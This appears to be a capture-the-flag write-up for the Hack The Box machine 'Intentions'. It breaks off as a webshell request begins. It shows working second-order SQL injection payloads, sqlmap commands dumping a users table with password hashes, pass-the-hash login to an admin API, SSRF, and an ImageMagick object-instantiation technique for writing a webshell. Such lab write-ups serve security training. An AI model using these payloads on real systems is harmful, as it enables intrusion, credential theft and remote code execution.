---
icon: ubuntu
---

# Intentions - Hard

<figure><img src="../../.gitbook/assets/image (20).png" alt="" width="75"><figcaption><p>Y<a href="https://www.hackthebox.com/machines/intentions"><strong>Intentions</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.220 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:56 EST
Nmap scan report for 10.10.11.220
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'll register an account and login

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

There is a welcome message on logging in, the Gallery tab contains images with classified by genres

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$primary;">**Your Feed**</mark> shows the same pictures filtered by the genres set on my profile

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Changing the genres and click update will reflect in the images shown in the feed

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

The HTTP response headers contains 2 cookies `XSRF-TOKEN` and `intentions_session`, this format is usually seen in LARAVEL PHP Frameworks. Visiting a nonexistant page will see the Laravel Specific 404 message

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Looking at HTML souce, I saw two interesting includes

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Both files are heavily obfuscated it's worth directory busting the /js endpoint for .js extensions&#x20;

#### <mark style="color:yellow;">Directory Busting</mark>

```shellscript
feroxbuster -u http://10.10.11.220/js -x js
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

there is an admin.js file! Let's check it out

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

At the very bottom there is some text:

<mark style="color:$info;">Hey team, I’ve deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs.</mark>

<mark style="color:$info;">​ This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!</mark>

<mark style="color:$info;">​ By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.</mark>

<mark style="color:$info;">​ This should take care of the concerns raised by our users regarding our lack of HTTPS connection.</mark>

<mark style="color:$info;">The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I’ve included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some</mark>

We learn that there’s a user named `greg`, there’s a version 2 API that is functioning in the `admin` section and passwords are hashed with `BCrypt`

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Also at the bottom there is a reference to imagick.php

### <mark style="color:$primary;">SQLI in update genres form</mark>

Adding a ' in the favorite genre's under your profile and updating it actually brakes your feed

<figure><img src="../../.gitbook/assets/image (2981).png" alt=""><figcaption></figcaption></figure>

Visiting your feed after adding a ' as a genre you will see a 500 server error. This is a sign that there's injection here

<figure><img src="../../.gitbook/assets/image (2982).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Figuring out the Querry</mark>

The SQL query running on the server might look something like

```sql
SELECT * from images WHERE genre IN ('genre1', 'genre2', 'genre3')
```

If it is so I want my input to close both the single quote as well as the parenthesis, with something like `food,') or 1=1;-- -` Unfortunately this still errors out

Having a space in the query might be messing something up. Without knowing what it's doing, I can try using comments instead of spaces, like this

```sql
food')/**/or/**/1=1#
```

It’s important to switch from the `-- -` comment to `#`, as the former requires a space to make the comment, and I’m testing without spaces so `--/**/-` will not work

With my genres set to that \[`food')/**/or/**/1=1#`], “Your Feed” populates with images of genre animal, architecture, feed, nature, etc. This is successful injection, and it’s a second-order SQL injection because the query to one page that sets the injection is then manifested on another page when viewed.

#### <mark style="color:yellow;">Finding Number of Columns</mark>

To do a UNION injection, I’ll need to know the number of columns naturally returned from the query so I can UNION on that same number of columns of data to leak

I’ll see from the data returned above that each image has at least six things returned (`id`, `file`, `genre`, `created_at`, `udpated_at`, and `url`), through `url` could be generated from `file`, so maybe only five items. I’ll try five like this:&#x20;

```sql
')/**/UNION/**/SELECT/**/1,2,3,4,5#
```

<figure><img src="../../.gitbook/assets/image (2984).png" alt=""><figcaption></figcaption></figure>

In Repeater, I’ll request the feed, and it returns exactly what I’m hoping for

<figure><img src="../../.gitbook/assets/image (2985).png" alt=""><figcaption></figcaption></figure>

The input numbers one through five are in each of these columns, and the `url` is built from the `file` (as guessed)

#### <mark style="color:yellow;">Database Enumeration</mark>

Now I can use that template to make queries into the database. “2” and “3” are the only things that can take strings, so I’ll focus there. If I replace “2” with “user()” and “3” with “database()”, it shows the results:

```sql
')/**/UNION/**/SELECT/**/1,user(),database(),4,5#
```

<figure><img src="../../.gitbook/assets/image (2987).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2986).png" alt=""><figcaption><p>Your feed Burp Request</p></figcaption></figure>

The user is laravel@localhost, and the database is intentions. I’ll use `version()` to get the version of 10.6.12-MariaDB-0ubuntu0.22.04.1.

I’ll change genres to get the list of databases and tables

{% code overflow="wrap" %}
```sql
')/**/UNION/**/SELECT/**/1,table_schema,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema/**/!=/**/'information_schema'#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2988).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2989).png" alt=""><figcaption><p>Your Feed Burp Request</p></figcaption></figure>

The only database is `intentions`, and there are four tables: `gallery_images`, `personal_access_tokens`, `migrations`, and `users`.

The most immediately interesting table is `users`. I’ll update my genres to list the columns in that table

{% code overflow="wrap" %}
```sql
')/**/UNION/**/SELECT/**/1,2,column_name,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2990).png" alt=""><figcaption></figcaption></figure>

{% code title="Your Feed Burp response" overflow="wrap" %}
```json
{
    "status": "success",
    "data":
    [
        {
            "id": 1,
            "file": "2",
            "genre": "id",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "name",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "email",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "password",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "created_at",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "updated_at",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "admin",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        },
        {
            "id": 1,
            "file": "2",
            "genre": "genres",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "/storage/2"
        }
    ]
}
```
{% endcode %}

This returns `id`, `name`, `email`, `password`, `created_at`, `updated_at`, and `genres`. I’ll update my query to get all of the interesting information in one column using `concat`

{% code overflow="wrap" %}
```sql
')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2991).png" alt=""><figcaption></figcaption></figure>

You will get a long json with users

<figure><img src="../../.gitbook/assets/image (2992).png" alt=""><figcaption></figcaption></figure>

I'll use command line fu to extract the data of users

```shellscript
steve:steve@intentions.htb:1:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:food,travel,nature
greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:food,travel,nature
Melisa Runolfsson:hettie.rutherford@example.org:0:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6:food,travel,nature
Camren Ullrich:nader.alva@example.org:0:$2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2:food,travel,nature
Mr. Lucius Towne I:jones.laury@example.com:0:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae:food,travel,nature
Jasen Mosciski:wanda93@example.org:0:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW:food,travel,nature
Monique D'Amore:mwisoky@example.org:0:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7.:food,travel,nature
Desmond Greenfelder:lura.zieme@example.org:0:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2:food,travel,nature
Mrs. Roxanne Raynor:pouros.marcus@example.net:0:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO:food,travel,nature
Rose Rutherford:mellie.okon@example.com:0:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m:food,travel,nature
Dr. Chelsie Greenholt I:trace94@example.net:0:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W:food,travel,nature
Prof. Johanna Ullrich MD:kayleigh18@example.com:0:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi:food,travel,nature
Prof. Gina Brekke:tdach@example.com:0:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.:food,travel,nature
Jarrett Bayer:lindsey.muller@example.org:0:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS:food,travel,nature
Macy Walter:tschmidt@example.org:0:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm:food,travel,nature
Prof. Devan Ortiz DDS:murray.marilie@example.com:0:$2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S:food,travel,nature
Eula Shields:barbara.goodwin@example.com:0:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2:food,travel,nature
Mariano Corwin:maggio.lonny@example.org:0:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya:food,travel,nature
Madisyn Reinger DDS:chackett@example.org:0:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW:food,travel,nature
Jayson Strosin:layla.swift@example.net:0:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei:food,travel,nature
Zelda Jenkins:rshanahan@example.net:0:$2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2:food,travel,nature
Eugene Okuneva I:shyatt@example.com:0:$2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy:food,travel,nature
Mrs. Rhianna Hahn DDS:sierra.russel@example.com:0:$2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma:food,travel,nature
Viola Vandervort DVM:ferry.erling@example.com:0:$2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa:food,travel,nature
Prof. Margret Von Jr.:beryl68@example.org:0:$2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa:food,travel,nature
Florence Crona:ellie.moore@example.net:0:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy:food,travel,nature
Tod Casper:littel.blair@example.org:0:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou:food,travel,nature
Deimos:deimos@gmail.com:0:$2y$10$WIEij5xDfRWXcYJ6PfoGy.VDv13kyg3GZ0jXzoSji55NjyRARzpfK:')\/**\/UNION\/**\/SELECT\/**\/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5\/**\/from\/**\/users#
```

### <mark style="color:$primary;">SQLI using sqlmap</mark>

I can do all the steps above with `sqlmap`. I’ll need a couple things:

* Save request setting genres without any injection and only a single genre to a file, `genres.req`.
* Save a request fetching the user feed to a file, `feed.req`.

I’ll do this in Burp by right clicking and selecting “Copy to file”. This is preferred over giving it the URL because then the cookies and other headers will match.

The `sqlmap` syntax has updated over the last five years since Nightmare. `--second-order` is deprecated in favor of `--second-req`. I’ll give it `--tamper=space2comment` (sqlmap will fail without this for the reasons seen above, but it will also suggest trying this tamper). I’ll also give it `--technique=U` to limit to union injections. It will find the union without this, but it’ll go faster since I know this is possible. I will need to increase the `--level 5`, which is the max. With all of this, it finds the injection:

{% code overflow="wrap" %}
```shellscript
sqlmap -r genres.req --second-req feed.req --batch --tamper=space2comment --technique=U --level 5
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2993).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Enumerate</mark>

I’ll add `--dbs` to the end and it prints the two db names

{% code overflow="wrap" %}
```shellscript
sqlmap -r genres.req --second-req feed.req --batch --tamper=space2comment --technique=U --level 5 --dbs
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2994).png" alt=""><figcaption></figcaption></figure>

Replacing `--dbs` with `-D intentions --tables` will list the tables in `intentions`

{% code overflow="wrap" %}
```shellscript
sqlmap -r genres.req --second-req feed.req --batch --tamper=space2comment --technique=U --level 5 -D intentions --tables
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2995).png" alt=""><figcaption></figcaption></figure>

Replacing `--tables` with `-T users --dump` will dump that table

{% code overflow="wrap" %}
```shellscript
sqlmap -r genres.req --second-req feed.req --batch --tamper=space2comment --technique=U --level 5 -D intentions -T users --dump
```
{% endcode %}

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ sqlmap -r genres.req --second-req feed.req --batch --tamper=space2comment --technique=U --level 5 -D intentions -T users --dump
...[snip]...
Database: intentions
Table: users
[28 entries]
+----+-------------------------------+--------------------------+--------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
| id | email                         | name                     | genres                         | admin   | password                                                     | created_at          | updated_at          |
+----+-------------------------------+--------------------------+--------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
| 1  | steve@intentions.htb          | steve                    | food,travel,nature             | 1       | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
| 2  | greg@intentions.htb           | greg                     | food,travel,nature             | 1       | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |
| 3  | hettie.rutherford@example.org | Melisa Runolfsson        | food,travel,nature             | 0       | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 4  | nader.alva@example.org        | Camren Ullrich           | food,travel,nature             | 0       | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 5  | jones.laury@example.com       | Mr. Lucius Towne I       | food,travel,nature             | 0       | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 6  | wanda93@example.org           | Jasen Mosciski           | food,travel,nature             | 0       | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 7  | mwisoky@example.org           | Monique D'Amore          | food,travel,nature             | 0       | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 8  | lura.zieme@example.org        | Desmond Greenfelder      | food,travel,nature             | 0       | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 9  | pouros.marcus@example.net     | Mrs. Roxanne Raynor      | food,travel,nature             | 0       | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 10 | mellie.okon@example.com       | Rose Rutherford          | food,travel,nature             | 0       | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 11 | trace94@example.net           | Dr. Chelsie Greenholt I  | food,travel,nature             | 0       | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 12 | kayleigh18@example.com        | Prof. Johanna Ullrich MD | food,travel,nature             | 0       | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 13 | tdach@example.com             | Prof. Gina Brekke        | food,travel,nature             | 0       | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 14 | lindsey.muller@example.org    | Jarrett Bayer            | food,travel,nature             | 0       | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 15 | tschmidt@example.org          | Macy Walter              | food,travel,nature             | 0       | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 16 | murray.marilie@example.com    | Prof. Devan Ortiz DDS    | food,travel,nature             | 0       | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 17 | barbara.goodwin@example.com   | Eula Shields             | food,travel,nature             | 0       | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 18 | maggio.lonny@example.org      | Mariano Corwin           | food,travel,nature             | 0       | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 19 | chackett@example.org          | Madisyn Reinger DDS      | food,travel,nature             | 0       | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 20 | layla.swift@example.net       | Jayson Strosin           | food,travel,nature             | 0       | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 21 | rshanahan@example.net         | Zelda Jenkins            | food,travel,nature             | 0       | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 22 | shyatt@example.com            | Eugene Okuneva I         | food,travel,nature             | 0       | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 23 | sierra.russel@example.com     | Mrs. Rhianna Hahn DDS    | food,travel,nature             | 0       | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 24 | ferry.erling@example.com      | Viola Vandervort DVM     | food,travel,nature             | 0       | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 25 | beryl68@example.org           | Prof. Margret Von Jr.    | food,travel,nature             | 0       | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 26 | ellie.moore@example.net       | Florence Crona           | food,travel,nature             | 0       | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 27 | littel.blair@example.org      | Tod Casper               | food,travel,nature             | 0       | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 28 | test@test.com                 | Test                     | food')/**/__REFLECTED_VALUE__# | 0       | $2y$10$8Fh2y09/hVQyZZVmxVDMn.0Jin7yzzxW8PgFaz.LUeMBfVWFT4HbG | 2025-04-23 16:07:14 | 2025-04-23 20:14:16 |
+----+-------------------------------+--------------------------+--------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
```

I tried cracking the hashes but after 10 minutes I got nothing back so I moved to something else

#### <mark style="color:$primary;">Enumerate v2 Login</mark>

I noted [above ](intentions-hard.md#directory-busting)the text in `admin.js` that mentioned the new `v2` login API endpoint that did the hashing client-side so that user passwords aren’t submitted in the clear. I could enumerate the entire `v2` API, but I’ll start with seeing if there’s a `login` function in the same place as `v1`.

I’ll send a login request over to Burp Repeater, and update the URL from `/api/v1/auth/login` to `/api/v2/auth/login` without changing the POST body. When I send this, the response body has a failure

```json
{
    "status":"error",
    "errors":{
        "hash":[
            "The hash field is required."
        ]
    }
}
```

The POST body for that request looks like

```json
{
    "email":"test@test.com",
    "password":"Test"
}
```

I’ll change `password` to `hash`, and the result is the same as when I have the wrong password on v1

```json
{
    "error":"login_error"
}
```

### <mark style="color:$primary;">Auth as Admin</mark>

I’ll update the POST to have steve’s email and hash, and it works

<figure><img src="../../.gitbook/assets/image (2996).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2997).png" alt=""><figcaption></figcaption></figure>

The easiest way to get authed in Firefox is log out, put Burp Proxy in Intercept mode, and login with steve’s email and hash. When Burp catches this request, I’ll change `v1` to `v2`, and `password` to `hash`, and send it, disabling Intercept.

Now going to `/admin` returns an admin interface (that includes the cards from the JS file)

<figure><img src="../../.gitbook/assets/image (2998).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">RCE via ImageMagick</mark>

#### <mark style="color:yellow;">Enumerate Admin</mark>

In the admin site, there’s a users page that shows the users of the site

<figure><img src="../../.gitbook/assets/image (2999).png" alt=""><figcaption></figcaption></figure>

There’s no interaction here. On the “Images” tab, it lists the images that are available for the gallery

<figure><img src="../../.gitbook/assets/image (3000).png" alt=""><figcaption></figcaption></figure>

Clicking on “Edit” loads the image with four buttons at the top and a bunch of metadata at the bottom

<figure><img src="../../.gitbook/assets/image (3001).png" alt=""><figcaption></figcaption></figure>

Clicking “CHARCOAL”, the image reloads with that effect

<figure><img src="../../.gitbook/assets/image (3002).png" alt=""><figcaption></figcaption></figure>

Clicking the effect button sends a POST to `/api/v2/admin/image/modify` with a JSON body

```json
{
    "path":"/var/www/html/intentions/storage/app/public/food/rod-long--LMw-y4gxac-unsplash.jpg",
    "effect":"charcoal"
}
```

**I noted** [**above**](intentions-hard.md#directory-busting) **the reference to `imagick`, which is almost certainly** [**ImageMagick**](https://imagemagick.org/index.php)

### SSRF

The `path` input takes a local path, but if this is using PHP, it’s likely that could take a URL as well. I’ll start a Python webserver on my host, and give it `http://10.10.16.2` as the `path`. There’s a hit

<figure><img src="../../.gitbook/assets/image (3004).png" alt=""><figcaption></figcaption></figure>

```shellscript
10.10.11.220 - - [23/Apr/2025 16:33:58] "GET / HTTP/1.1" 200 -
```

If I serve an image, the modified image is sent back

<figure><img src="../../.gitbook/assets/image (3005).png" alt=""><figcaption></figcaption></figure>

I can base64 decode that into a file and view it for the image. For example, a Google local made charcoal

```shellscript
echo -n "iVBORw0KGgoAAAANSUhEUgAAAOE...[snip]..." | base64 -d > charcoal-google.jpg
```

<figure><img src="../../.gitbook/assets/image (3006).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Failures</mark>

I’ll try a bunch of things that don’t work lead to much:

* There is a path in this post request. I can try to read other files. If I give it `/etc/passwd`, the response is an HTTP 422, with the body “bad image path”.
* There’s a bunch of Image Magick CVEs that could be interesting, but I’m not able to make any of them work here for various reasons.
* Trying to abuse the SSRF to find other things on the box all fails as well. Unless the program is able to provide an image, it just errors.

#### <mark style="color:yellow;">Confirm ImageMagicK</mark>

There’s a neat trick in the post I’ll go into next section to verify this is ImageMagick! ImageMagick will handle a filename with `[AxB]` appended to the end (where “A” and “B” are numbers) and scale the image based on that. I’ll load a standard request to `/api/v2/admin/image/modify` in Burp Repeater:

<figure><img src="../../.gitbook/assets/image (3007).png" alt=""><figcaption></figcaption></figure>

This returns just fine. If I add `[]` to the end of the filename, it fails

<figure><img src="../../.gitbook/assets/image (3008).png" alt=""><figcaption></figcaption></figure>

But, if I add dimensions within the `[]`, it works again

<figure><img src="../../.gitbook/assets/image (3009).png" alt=""><figcaption></figcaption></figure>

The base64 decodes to a very small version of the picutre. But more importantly, this behavior for handling paths is relatively unique to ImageMagick

#### <mark style="color:yellow;">Arbitrary Object Instantiation</mark>

[This article](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) has a bunch of details about how to exploit Arbitrary Object Instantiation vulnerabilities in PHP. The article is a bit hard to follow, but it’s looking at cases the author calls `$a($b)`, which is to say some class if passing an attacker controlled variable to it’s constructor. And the example in the article is Imagick!

To exploit ImageMagick, the post goes into the Magick Scripting Language (MSL) format. In the post, it shows how passing a URL with an `msl:` scheme to a new `Imagick` object results in an arbitrary file write:

<figure><img src="../../.gitbook/assets/image (3010).png" alt=""><figcaption></figcaption></figure>

Unfortunately, I can’t chain `msl:/` and `http://` ( like `msl:/http://10.10.14.6/`), as that isn’t supported. So I need to get a `.msl` file on disk.

The author looks at how PHP writes temp files to `/tmp/php?` where `?` is a long random string while the request is being handled. At first, they try to brute force all possible file descriptors, but then discover the `vid:` scheme. The code for parsing these passes the result to `ExpandFilenames`, which effectively takes things like `*` and expands it to get files that match. So with the `vid:` scheme, I can reference the file as `/tmp/php*.dat` successfully.

#### <mark style="color:yellow;">Webshell</mark>

Putting this all together, I need to pass into the `Imagick` constructor something that looks like this: `/vid:msl:/tmp/php*`. Then, I need to have attached to the request a file to be written to the temp location that is an `.msl` file, such that when ImageMagick processes the file, it writes a webshell to some location on the disk.

I’ll start with the request as it’s sent by the site:

```json
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.10.11.220
Content-Length: 116
